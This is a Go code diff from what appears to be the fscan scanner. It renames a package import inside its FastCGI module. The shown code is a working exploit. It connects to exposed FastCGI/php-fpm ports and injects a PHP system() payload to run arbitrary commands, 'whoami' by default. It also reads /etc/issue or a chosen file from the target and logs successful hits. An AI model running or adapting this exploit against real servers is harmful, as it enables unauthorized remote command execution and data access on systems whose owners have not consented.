@@ -6,7 +6,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"github.com/itchen-2002/fscan/common"
+	"github.com/itchen-2002/fscan/Config"
 	"io"
 	"strconv"
 	"strings"
@@ -18,22 +18,22 @@ import (
 //https://xz.aliyun.com/t/9544
 //https://github.com/wofeiwo/webcgi-exploits
 
-func FcgiScan(info *common.HostInfo) {
-	if common.IsBrute {
+func FcgiScan(info *Config.HostInfo) {
+	if Config.IsBrute {
 		return
 	}
 	url := "/etc/issue"
-	if common.Path != "" {
-		url = common.Path
+	if Config.Path != "" {
+		url = Config.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 	var reqParams string
 	var cutLine = "-----ASDGTasdkk361363s-----\n"
 	switch {
-	case common.Command == "read":
+	case Config.Command == "read":
 		reqParams = ""
-	case common.Command != "":
-		reqParams = "<?php system('" + common.Command + "');die('" + cutLine + "');?>"
+	case Config.Command != "":
+		reqParams = "<?php system('" + Config.Command + "');die('" + cutLine + "');?>"
 	default:
 		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
 	}
@@ -54,7 +54,7 @@ func FcgiScan(info *common.HostInfo) {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
-	fcgi, err := New(addr, common.Timeout)
+	fcgi, err := New(addr, Config.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
 			fcgi.rwc.Close()
@@ -62,14 +62,14 @@ func FcgiScan(info *common.HostInfo) {
 	}()
 	if err != nil {
 		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
-		common.LogError(errlog)
+		Config.LogError(errlog)
 		return
 	}
 
 	stdout, stderr, err := fcgi.Request(env, reqParams)
 	if err != nil {
 		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
-		common.LogError(errlog)
+		Config.LogError(errlog)
 		return
 	}
 
@@ -100,14 +100,14 @@ func FcgiScan(info *common.HostInfo) {
 		} else {
 			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Host, info.Ports, output)
 		}
-		common.LogSuccess(result)
+		Config.LogSuccess(result)
 	} else if strings.Contains(output, "File not found") || strings.Contains(output, "Content-type") || strings.Contains(output, "Status") {
 		if len(stderr) > 0 {
 			result = fmt.Sprintf("[+] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
 		} else {
 			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Host, info.Ports, output)
 		}
-		common.LogSuccess(result)
+		Config.LogSuccess(result)
 	}
 }
 
@@ -183,7 +183,7 @@ type FCGIClient struct {
 }
 
 func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
-	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
+	conn, err := Config.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
 	fcgi = &FCGIClient{
 		rwc:       conn,
 		keepAlive: false,
